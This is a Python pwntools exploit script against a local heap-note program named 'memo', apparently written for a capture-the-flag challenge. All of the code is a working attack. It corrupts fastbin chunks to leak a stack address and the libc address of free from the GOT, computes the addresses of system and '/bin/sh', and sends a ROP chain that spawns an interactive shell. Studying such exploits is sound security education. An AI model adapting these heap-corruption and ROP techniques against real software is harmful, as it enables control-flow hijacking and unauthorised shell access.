#!/usr/bin/env python

from pwn import *
import sys

heap_size=0x602a38
got_free=0x00601f78
free_off=504624
pop_rdi_ret=0x0000000000401263
pop_rsi_r15_ret=0x0000000000401261

def leave_msg(r,idx,size,payload):
    r.sendlineafter(">> ",str(1))
    r.sendlineafter(": ",str(idx))
    r.sendlineafter(": ",str(size))
    if size > 32:
        r.recvline()
        r.send(payload)
    else:
        r.sendafter(": ",payload)

def edit_msg(r,payload):
    r.sendlineafter(">> ",str(2))
    r.sendlineafter(": ",payload)

def view(r,idx):
    r.sendlineafter(">> ",str(3))
    r.sendlineafter(": ",str(idx))
    r.recvuntil(": ")
    msg=u64(r.recvline().strip().ljust(8,"\x00"))
    return msg

def remove(r,idx):
    r.sendlineafter(">> ",str(4))
    r.sendlineafter(": ",str(idx))

def new_creds(r,old_pass,new_uname,new_pass):
        r.sendlineafter(">> ",str(5))
        r.sendlineafter(": ",str(old_pass))
        r.sendlineafter(": ",str(new_uname))
        r.sendlineafter(": ",str(new_pass))
    
def main():
    if (len(sys.argv) == 2) and (sys.argv[1] == "local"):
        #print "%d" % len(sys.argv)
        r=process("./memo")
        r.sendlineafter(": ","asdf")
        r.sendlineafter(") ","y")
        r.sendlineafter(": ",p64(0x31))
        for x in range(3):
            leave_msg(r,x,32,"\n")
        #raw_input("Continue?")
        remove(r,1)
        remove(r,0)
        #raw_input("Continue?")
        payload=fit({40:p64(0x31)+p64(heap_size)},length=60) # Just for circumventing malloc check
        leave_msg(r,0,60,payload+"\n") # notes array won't be updated (if there is a chunk in fastbin train it never does this)
        #raw_input("Continue?")
        log.info("[DEBUG] pid is: %d" % r.proc.pid)
        log.info("Editing msg 0")
        leave_msg(r,3,32,"\n")
        #raw_input("Continue?")
        payload=fit({40:p64(0x602a98)},length=48)
        leave_msg(r,0,48,payload)
        #raw_input("Continue?")
        stack=view(r,0)
        log.success("Leaked stack addy @ {}".format(hex(stack)))
        remove(r,2)
        remove(r,3)
        #raw_input("Continue?")
        payload=fit({24:p64(0xff),40:p64(0x31)+p64(heap_size)},length=60)
        leave_msg(r,3,60,payload)
        #raw_input("Continue?")
        leave_msg(r,1,60,"\n")
        #raw_input("Continue?")
        payload=fit({24:p64(0xff00000000),40:p64(got_free)+p64(stack)},length=56)
        leave_msg(r,1,57,payload+"\n")
        free=view(r,0)
        log.info("libc addy of free: {}".format(hex(free)))
        raw_input("Continue?")
        system = free - 245456 
        binsh = free + 943433
        payload = fit({24:p64(pop_rdi_ret)+p64(binsh)+p64(pop_rsi_r15_ret)+p64(0)+p64(0)+p64(system)})
        edit_msg(r,payload)
        r.interactive()
    elif len(sys.argv) == 1:
        print "You should provide the argument 'local' at least..."
        exit(1)
    else:
        exit(1)
    
if __name__=="__main__":
    main()
